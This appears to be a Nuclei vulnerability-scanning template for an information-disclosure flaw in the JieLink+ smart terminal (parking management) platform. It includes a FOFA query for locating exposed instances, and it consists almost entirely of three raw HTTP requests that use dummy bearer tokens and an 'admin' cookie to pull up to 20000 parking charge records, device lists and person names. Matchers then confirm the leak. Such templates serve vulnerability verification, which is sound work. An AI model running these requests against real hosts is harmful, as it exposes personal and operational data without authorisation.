id: jielink-disclosure
info:
  name: JieLink+ 智能终端操作平台 - 敏感信息泄露漏洞
  author: leadlife
  severity: high
  description: JieLink+智能终端操作平台多个接口处存在敏感信息泄露漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。
  reference: 
    - https://github.com/wy876/POC/blob/main/JieLink/JieLink+%E6%99%BA%E8%83%BD%E7%BB%88%E7%AB%AF%E6%93%8D%E4%BD%9C%E5%B9%B3%E5%8F%B0%E5%A4%9A%E4%B8%AA%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="JieLink+智能终端操作平台"
  tags: jielink,disclosure


http:
  - raw:
      - |
        POST /report/ParkChargeRecord/GetDataList HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
        Accept: application/json, text/javascript, \*/\*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Authorization: Bearer test
        Cookie: JSESSIONID=test;UUID=1; userid=admin
        X-Requested-With: XMLHttpRequest
        Content-Length: 21
        Origin: http://x.xx.xx.x:xxx
        Connection: close
        Referer: http://x.xx.xx.x:xxx/Report/ParkOutRecord/Index
        Sec-GPC: 1
        Priority: u=1

        page=1&rows=20000

      - |+
        GET /Report/ParkCommon/GetParkInThroughDeivces HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
        Accept: application/json, text/javascript, \*/\*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        X-Requested-With: XMLHttpRequest
        Origin:
        Connection: close
        Referer:
        Sec-GPC: 1

      - |+
        GET /report/ParkOutRecord/GetDataList HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
        Accept: application/json, text/javascript, \*/\*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Authorization: Bearer test
        Cookie: JSESSIONID=test;UUID=1; userid=admin
        X-Requested-With: XMLHttpRequest
        Content-Length: 2
        Origin:
        Connection: close
        Referer:
        Sec-GPC: 1
        Priority: u=1

    matchers:
      - type: dsl
        dsl:
          - contains_all(body_1,'total','rows','OrderId','OperatorName')
          - contains_all(body_2,'DGUID','DeviceType','DeviceName')
          - contains_all(body_3,'total','rows','PersonName')
        condition: or